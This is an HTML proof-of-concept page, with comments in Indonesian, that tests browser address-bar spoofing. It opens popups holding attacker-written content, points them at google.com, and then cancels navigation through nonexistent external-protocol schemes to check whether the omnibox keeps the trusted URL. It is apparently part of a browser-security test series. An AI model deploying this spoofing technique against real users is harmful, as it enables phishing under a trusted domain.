<!-- 17 | F1 · skema yang diserahkan ke OS lalu GAGAL — pembatalan dari jalur keempat | [1-CLICK]
     Empat cara navigasi dibatalkan setelah bar berganti: dialog (13), unduhan (15),
     stop() (16), dan yang ini - penyerahan skema ke sistem operasi.
     Browser melihat skema yang bukan miliknya, menyerahkannya ke OS, dan MEMBATALKAN
     navigasi web-nya. Kalau OS tak punya penangan, tak ada apa pun yang terbuka -
     tapi jalur pembatalannya tetap dilewati.
     Empat skema diuji, dari yang pasti tidak ada sampai yang mungkin ada, supaya kamu bisa
     memisahkan "dibatalkan karena tak ada penangan" dari "dibatalkan setelah OS menolak":
       xnurx-noop://   (dijamin tidak ada, nol aplikasi terbuka)
       web+xnurx://    (skema web+ terdaftar, ditangani berbeda)
       ms-noop://      (bentuk skema Windows)
       intent://       (bentuk Android, diabaikan di desktop)
     EXPECTED-SECURE  bar tidak pernah berubah oleh navigasi yang dibatalkan sebelum commit.
     Nol aplikasi eksternal dibuka: keempatnya sengaja tidak ada. -->
<h2 style="font:20px system-ui">HALAMAN PENYERANG</h2>
<button onclick="go()">Run 17 (4 tab)</button>
<pre id=g style="font:12px/1.7 monospace"></pre>
<script>
var S = ['xnurx-noop://hold', 'web+xnurx://hold', 'ms-noop://hold', 'intent://hold#Intent;scheme=xnurx;end'];
var T = 'https://www.google.com/';
g.textContent = 'REAL ORIGIN: ' + location.href;
function go() {
  S.forEach(function (s, i) {
    setTimeout(function () {
      var w = window.open('', '', 'width=340,height=200,left=' + (30 + i * 350) + ',top=60');
      if (!w) return;
      w.document.write('<div style="font:12px system-ui;padding:8px"><b>' + s.split(':')[0] + '</b><br>isi milik ' + location.origin + '</div>');
      w.location = T;
      setTimeout(function () { try { w.location = s; } catch (e) { } }, 120);
    }, i * 300);
  });
  g.textContent = 'REAL ORIGIN: ' + location.origin + '\n4 tab dibuka.\n\nCari tab yang omniboxnya tersangkut di ' + T + '\nsementara isinya masih tulisan di atas.';
}
</script>
